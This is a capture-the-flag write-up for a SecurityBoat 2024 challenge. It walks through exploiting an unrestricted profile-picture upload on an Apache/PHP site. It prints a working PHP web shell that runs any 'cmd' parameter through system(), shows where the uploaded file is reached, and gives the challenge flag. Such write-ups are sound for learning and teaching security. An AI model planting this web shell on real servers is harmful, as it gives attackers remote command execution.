# SecurityBoat 2024 CTF January Challenge

Today we are going to solve ctf challenge which has Arbitary File Upload Vulnerability.

1.  First I crawl the site, Only page that seem useful was login page (login.html)

2.  I tried SQLi and many other things, but nothing was useful . So I registered a user and logged in .

3.  After login, I went to the profile page , there was a upload profile feature.
  <img width="252" alt="image" src="https://github.com/MrKrYP70n/Writeups/assets/114393219/8f1fc20c-e27d-4396-a384-ad936e4956b2">

4.  There I knew that it would be arbitary file upload feature .

5.   First I uploaded a sample image, and checked its location on server using inspect element
<img width="556" alt="image" src="https://github.com/MrKrYP70n/Writeups/assets/114393219/da57cc32-1378-472a-90f5-9c87fdcf9ca7">

6.    Now, I created a php script to upload it.
````
<?php 
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}?>
````
7.  why php ? --> So if we go to the non valid directory we can see the error is exposing that it is a Apache server and Apache server mostly uses php files.
<img width="333" alt="image" src="https://github.com/MrKrYP70n/Writeups/assets/114393219/29e73d70-f844-478f-b222-8cbbd77dcb7e">

8.   File uploaded successfully.

9.   Let's go to the uploaded image directory (assets/profPic/shelly.php) which we got in #5 point .

10.   And Boom ! , We got command execution .
<img width="402" alt="image" src="https://github.com/MrKrYP70n/Writeups/assets/114393219/1f2e6305-d6d5-495d-b36b-3548b2cd0132">

11.   <img width="466" alt="image" src="https://github.com/MrKrYP70n/Writeups/assets/114393219/2eec3234-6479-4a66-add6-4df882c6748d">

12.  ````{Unrestr!cted_F!le_Upload_!s_Fun} ````

This was a pretty good and easy challenge.
